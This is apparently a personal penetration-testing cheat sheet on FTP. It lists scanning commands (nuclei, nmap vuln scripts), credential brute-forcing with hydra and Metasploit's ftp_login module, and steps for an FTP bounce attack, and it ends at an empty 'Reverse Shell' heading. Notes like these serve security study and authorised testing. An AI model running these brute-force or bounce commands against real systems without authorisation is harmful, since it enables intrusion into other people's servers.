
#complete
# Enumeration 


```
nuclei -u http://url.com -tags ftp 

```



*Nmap Scans*

>[!IMPORTANT]
>Do not assume that ftp port will always be on port 21. Sometimes, it is on a different one


```bash 

sudo nmap -sV -sC "$ip" --script=vuln -p 21 

sudo nmap -sC -sC "$ip" --script=ftp-features 

```


```
sudo python3 -m pip install pyftpdlib
sudo python3 -m pyftpdlib --port 21 -u user -P pass --write
```


# Exploitation 

## Brute Force Attack 


- may be better to find a target username list to have more accurate wordlist 

```
git clone https://github.com/urbanadventurer/username-anarchy
cd username-anarchy firstname lastname 
```

- this wordlist has both usernames and passwords 
```
ip=$1
hydra -L /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt ftp://$ip

```


```
msfconsole

Configure and run the FTP brute-force module:

use auxiliary/scanner/ftp/ftp_login set RHOSTS 10.196.201.145 set RPORT 21 set USER_FILE /root/user.txt set PASS_FILE /root/passwords.txt run
```


## FTB Bounce Attack 
- Exploits ability to redirect traffic, masking attack source 
- 1. Find server that doesn't restrict port command 
- 2. Connect to server
- 3. Use PORT command to redirect data 
- 4. Initiate file transfer
```
ftp $ip 

quote PORT $ip,port 

get filename

```

# Post Exploitation 

## Reverse Shell 
